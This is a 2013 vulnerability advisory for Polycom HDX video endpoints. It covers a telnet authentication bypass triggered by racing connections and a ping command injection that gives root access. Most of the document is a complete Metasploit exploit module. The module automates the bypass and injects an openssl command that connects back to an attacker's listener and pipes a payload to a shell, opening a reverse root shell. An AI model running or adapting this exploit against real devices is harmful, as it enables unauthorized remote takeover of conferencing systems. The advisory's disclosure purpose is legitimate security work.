========================================================================
= Polycom HDX Telnet Authorization Bypass
=
= Vendor Website:
=    www.polycom.com
=
= Affected Version:
=   Polycom HDX devices:
=     All releases prior to and including Commercial 3.0.5
=
= Public disclosure on January 18, 2013
=
========================================================================

== Overview ==

The Polycom HDX is a series of telecommunication and video devices. The
telnet component of Polycom HDX video endpoint devices is vulnerable to
an authorization bypass when multiple simultaneous connections are
repeatedly made to the service, allowing remote network attackers to
gain full access to a Polycom command prompt without authentication. 
Versions prior to 3.0.4 also contain OS command injection in the ping
command which can be used to escape the telnet prompt and execute
arbitrary commands as root.
 
== Solution ==

Until a software solution is released, Polycom recommends administrators
disable telnet on their HDX unit.
 
== Credit ==

Discovered and advised to Polycom Inc., 2012 by Paul Haas of
Security-Assessment.com.

== About Security-Assessment.com ==

Security-Assessment.com is a leading team of Information Security
consultants specializing in providing high quality Information Security
services to clients throughout the Asia Pacific region. Our clients
include some of the largest globally recognized companies in areas such
as finance, telecommunications, broadcasting, legal and government. Our
aim is to provide the very best independent advice and a high level of
technical expertise while creating long and lasting professional
relationships with our clients.

Web: www.security-assessment.com 
Email: info@security-assessment.com

== Exploitation ==

The following Metasploit module can be used to reproduce the issue:

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking
	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Report

	def initialize(info = {})
		super(update_info(info,
			'Name'			=> 'Polycom Command Shell Authorization Bypass',
			'Alias'			=> 'psh_auth_bypass',
			'Author'		=> [ 'Paul Haas <Paul [dot] Haas [at] Security-Assessment.com>' ],
			'DisclosureDate'	=> 'Jan 18 2013',
			'Description'	=> %q{
				The login component of the Polycom Command Shell on Polycom HDX
				Video End Points running software versions 3.0.5 and earlier
				is vulnerable to an authorization bypass when simultaneous
				connections are made to the service, allowing remote network
				attackers to gain access to a sandboxed telnet prompt without
				authentication. Versions prior to 3.0.4 contain OS command
				injection in the ping command which can be used to execute
				arbitrary commands as root.
			},
			'License'		=> MSF_LICENSE,
			'References'	=>
				[
					[ 'URL', 'http://www.security-assessment.com/files/documents/advisory/Polycom%20HDX%20Telnet%20Authorization%20Bypass%20-%20RELEASE.pdf' ],
					[ 'URL', 'http://blog.tempest.com.br/joao-paulo-campello/polycom-web-management-interface-os-command-injection.html' ]
				],
			'Platform'		=> 'unix',
			'Arch'			=> ARCH_CMD,
			'Privileged'	=> true,
			'Targets'		=> [ [ "Universal", {} ] ],
			'Payload'		=>
			{
				'Space'		=> 8000,
				'DisableNops'	=> true,
				'Compat'	=> { 'PayloadType'		=> 'cmd',},
			},
			'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_openssl' },
			'DefaultTarget' => 0
		))

		register_options(
			[
				Opt::RHOST(),
				Opt::RPORT(23),
				OptAddress.new('CBHOST', [ false, "The listener address used for staging the final payload" ]),
				OptPort.new('CBPORT', [ false, "The listener port used for staging the final payload" ])
			],self.class)
		register_advanced_options(
			[
				OptInt.new('THREADS', [false, 'Threads for authentication bypass', 6]),
				OptInt.new('MAX_CONNECTIONS', [false, 'Threads for authentication bypass', 100])
			], self.class)
	end

	def check
		connect
		sock.put(Rex::Text.rand_text_alpha(rand(5)+1) + "\n")
		::IO.select(nil, nil, nil, 1)
		res = sock.get
		disconnect

		if !(res and res.length > 0)
			return Exploit::CheckCode::Safe
		end

		if (res =~ /Welcome to ViewStation/)
			return Exploit::CheckCode::Appears
		end

		return Exploit::CheckCode::Safe
	end

	def exploit
		# Keep track of results (successful connections)
		results = []

		# Random string for password
		password = Rex::Text.rand_text_alpha(rand(5)+1)

		# Threaded login checker
		max_threads = datastore['THREADS']
		cur_threads = []

		# Try up to 100 times just to be sure
		queue = [*(1 .. datastore['MAX_CONNECTIONS'])]

		print_status("Starting Authentication bypass with #{datastore['THREADS']} threads with #{datastore['MAX_CONNECTIONS']} max connections ")
		while(queue.length > 0)
			while(cur_threads.length < max_threads)

				# We can stop if we get a valid login
				break if results.length > 0

				# keep track of how many attempts we've made
				item = queue.shift

				# We can stop if we reach max tries
				break if not item

				t = Thread.new(item) do |count|
						sock = connect
						sock.put(password + "\n")
						res = sock.get

						while res.length > 0
							break if results.length > 0

							# Post-login Polycom banner means success
							if (res =~ /Polycom/)
								results << sock
								break
							# bind error indicates bypass is working
							elsif (res =~ /bind/)
								sock.put(password + "\n")
							#Login error means we need to disconnect
							elsif (res =~ /failed/)
								break
							#To many connections means we need to disconnect
							elsif (res =~ /Error/)
								break
							end
							res = sock.get
						end
				end

				cur_threads << t
			end

			# We can stop if we get a valid login
			break if results.length > 0

			# Add to a list of dead threads if we're finished
			cur_threads.each_index do |ti|
				t = cur_threads[ti]
				if not t.alive?
					cur_threads[ti] = nil
				end
			end

			# Remove any dead threads from the set
			cur_threads.delete(nil)

			::IO.select(nil, nil, nil, 0.25)
		end

		# Clean up any remaining threads
		cur_threads.each {|sock| sock.kill }

		if results.length > 0
			print_good("#{rhost}:#{rport} Successfully exploited the authentication bypass flaw")
			do_payload(results[0])
		else
			print_error("#{rhost}:#{rport} Unable to bypass authentication, this target may not be vulnerable")
		end

	end

	def do_payload(sock)
		# Prefer CBHOST, but use LHOST, or autodetect the IP otherwise
		cbhost = datastore['CBHOST'] || datastore['LHOST'] || Rex::Socket.source_address(datastore['RHOST'])

		# Start a listener
		start_listener(true)

		# Figure out the port we picked
		cbport = self.service.getsockname[2]

		# Utilize ping OS injection to push cmd payload using stager optimized for limited buffer < 128
		cmd = "\nping ;s=$IFS;openssl${s}s_client$s-quiet$s-host${s}#{cbhost}$s-port${s}#{cbport}|sh;ping$s-c${s}1${s}0\n"
		sock.put(cmd)

		# Give time for our command to be queued and executed
		1.upto(5) do
			::IO.select(nil, nil, nil, 1)
			break if session_created?
		end
	end

	def stage_final_payload(cli)
		print_good("Sending payload of #{payload.encoded.length} bytes to #{cli.peerhost}:#{cli.peerport}...")
		cli.put(payload.encoded + "\n")
	end

	def start_listener(ssl = false)
		comm = datastore['ListenerComm']
		if comm == "local"
			comm = ::Rex::Socket::Comm::Local
		else
			comm = nil
		end

		self.service = Rex::Socket::TcpServer.create(
			'LocalPort' => datastore['CBPORT'],
			'SSL' => ssl,
			'SSLCert' => datastore['SSLCert'],
			'Comm' => comm,
			'Context' =>
				{
				'Msf' => framework,
				'MsfExploit' => self,
				})

		self.service.on_client_connect_proc = Proc.new { |client|
		stage_final_payload(client)
		}

		# Start the listening service
		self.service.start
	end

	# Shut down any running services
	def cleanup
		super
		if self.service
			print_status("Shutting down payload stager listener...")
			begin
				self.service.deref if self.service.kind_of?(Rex::Service)
				if self.service.kind_of?(Rex::Socket)
					self.service.close
					self.service.stop
				end
				self.service = nil
			rescue ::Exception
			end
		end
	end

	# Accessor for our TCP payload stager
	attr_accessor :service

end

